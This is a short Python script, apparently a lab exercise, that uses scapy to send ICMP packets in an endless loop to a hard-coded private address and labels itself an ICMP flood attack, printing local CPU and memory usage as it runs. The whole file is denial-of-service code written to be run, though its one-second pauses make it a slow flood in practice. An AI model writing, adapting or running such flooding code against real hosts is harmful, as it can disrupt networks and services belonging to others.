import psutil
import time
from scapy.all import *
from threading import Thread

# Target IP and Network Configuration
target_ip = "192.168.100.4"  # Replace with the target IP address

# Function to simulate ICMP Flood
def icmp_flood():
    print("Starting ICMP flood...")
    while True:
        send(IP(dst=target_ip)/ICMP(), verbose=False)
        # Track and display CPU and memory usage
        track_cpu_memory("ICMP")
        time.sleep(1)

# Function to track and display CPU and memory usage
def track_cpu_memory(flood_type):
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory().percent
    print(f"{flood_type} Flood - CPU Usage: {cpu}% | Memory Usage: {memory}%")

# Start the ICMP flood attack
if __name__ == "__main__":
    icmp_thread = Thread(target=icmp_flood)
    icmp_thread.start()
    icmp_thread.join()
